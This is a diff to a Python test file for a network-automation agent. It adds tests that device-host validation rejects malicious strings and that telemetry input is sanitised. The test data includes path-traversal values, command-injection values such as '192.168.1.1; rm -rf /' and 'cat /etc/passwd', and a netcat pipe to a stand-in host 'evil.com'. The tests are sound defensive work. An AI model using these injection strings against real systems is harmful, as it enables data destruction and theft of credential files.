@@ -5,6 +5,7 @@ from pydantic import ValidationError
 
 from networking_agent.models.device import DeviceInventory
 from networking_agent.models.intent import NetworkIntent
+from networking_agent.models.telemetry import TelemetryEvent
 
 
 @pytest.mark.parametrize(
@@ -108,3 +109,39 @@ def test_device_inventory_masks_password():
     # But netmiko dictionary gets the actual value
     net_dict = dev.to_netmiko_dict()
     assert net_dict["password"] == "MySecretPassword123"
+
+
+@pytest.mark.parametrize(
+    "malicious_host",
+    [
+        "../../etc/passwd",
+        r"..\..\Windows\System32",
+        "/etc/shadow",
+        "192.168.1.1; rm -rf /",
+        "10.0.0.1 && cat /etc/passwd",
+        "10.0.0.1 | nc evil.com 4444",
+        "10.0.0.1/evil",
+        "10.0.0.1\\evil",
+        "10.0.0.1\x00evil",
+        "10.0.0.1 evil",
+        "",
+        "   ",
+    ],
+)
+def test_device_inventory_rejects_malicious_host(malicious_host):
+    with pytest.raises(ValidationError):
+        DeviceInventory(host=malicious_host, device_type="cisco_ios")
+
+
+def test_telemetry_event_sanitizes_null_bytes_and_length():
+    # Strips null bytes
+    event = TelemetryEvent(raw_text="System alert\x00 on ether1")
+    assert event.raw_text == "System alert on ether1"
+
+    # Rejects empty after strip
+    with pytest.raises(ValidationError):
+        TelemetryEvent(raw_text="   \x00\x00   ")
+
+    # Rejects overly long payload (DoS defense)
+    with pytest.raises(ValidationError):
+        TelemetryEvent(raw_text="A" * 35000)
